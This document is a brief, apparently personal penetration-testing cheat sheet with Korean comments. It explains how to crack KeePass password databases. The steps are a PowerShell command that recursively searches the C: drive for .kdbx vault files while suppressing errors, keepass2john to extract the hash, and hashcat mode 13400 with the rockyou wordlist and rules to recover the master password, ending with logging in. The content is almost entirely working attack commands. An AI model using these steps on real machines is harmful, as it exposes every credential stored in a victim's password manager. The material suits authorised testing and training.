# KeePass Password Cracking

``` powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

- C 드라이브 전체에서 `.kdbx` 확장자를 가진 파일을 재귀적으로 검색.
- `-ErrorAction SilentlyContinue` 옵션은 접근 권한 오류 메시지를 숨김.

``` bash
keepass2john Database.kdbx > keepass.hash
```
``` bash
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```
```
login with master password
```
